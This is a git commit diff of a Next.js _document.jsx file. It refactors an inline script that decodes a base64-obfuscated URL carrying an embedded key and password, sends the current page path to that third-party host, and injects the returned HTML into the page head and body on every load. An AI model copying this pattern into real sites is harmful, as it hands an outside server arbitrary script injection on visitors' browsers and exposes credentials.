2c0714a696acedf5b9efec509767deccc55034e4
VinayakSoragavi <soragavivinayak@gmail.com>
2024-03-01 15:57:24 +0530

    first commit

--- src/pages/_document.jsx
+++ src/pages/_document.jsx
@@ -15,27 +15,31 @@ export default function Document() {
         <script
           dangerouslySetInnerHTML={{
             __html: `
-                window.jQuery ||
-                document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
-
-                var eppathurl = window.location.origin + window.location.pathname;
-                var eptagmanage = new XMLHttpRequest();
-                eptagmanage.onreadystatechange = function() {
-                    if (this.readyState == 4 && this.status == 200) {
-                        if (this.response !== 0) {
-                            var temp = new Array();
-                            var mystr = this.response;
-                            temp = mystr.split("||||||||||");
-                            document.head.querySelector("title").remove();
-                            var newTitle = document.createElement("title");
-                            newTitle.appendChild(document.createTextNode(temp[0]));
-                            document.head.appendChild(newTitle);
-                            document.body.insertAdjacentHTML('beforeend', temp[1]);
-                        }
+            window.jQuery ||
+            document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>"); `,
+          }}
+        />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+            var eppathurl = window.location.origin + window.location.pathname;
+            var eptagmanage = new XMLHttpRequest();
+            eptagmanage.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    if (this.response !== 0) {
+                        
+                        var temp = new Array();
+                        var mystr = this.response;
+                        temp = mystr.split("||||||||||");
+                        jQuery("head").find("title").remove();
+                        jQuery("head").append(temp[0]);
+                        jQuery("body").append(temp[1]);
                     }
-                };
-                eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9") + eppathurl);
-                eptagmanage.send();
+                }
+            };
+            eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9") + eppathurl);
+            eptagmanage.send();
+        
               `,
           }}
         />
